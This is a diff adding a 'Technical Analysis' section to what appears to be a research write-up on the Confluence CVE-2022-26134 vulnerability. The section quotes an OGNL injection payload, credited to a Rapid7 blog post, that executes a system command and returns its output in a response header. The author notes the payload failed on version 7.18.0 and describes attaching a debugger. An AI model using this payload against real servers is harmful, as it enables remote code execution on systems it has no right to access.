@@ -28,4 +28,13 @@ services:
                         - 5432:5432
 ```
 
-## Analysis
+## Technical Analysis
+
+Rapid7 Team did a great job on publishing the [blog post](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) and the exploit payload, here's the payload that I copied from their blog
+
+```java
+${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
+```
+
+But when I try that payload on Confluence version 7.18.0, it didn't work. So I add remote debugger to add breakpoints to see why it doesn't work. 
+
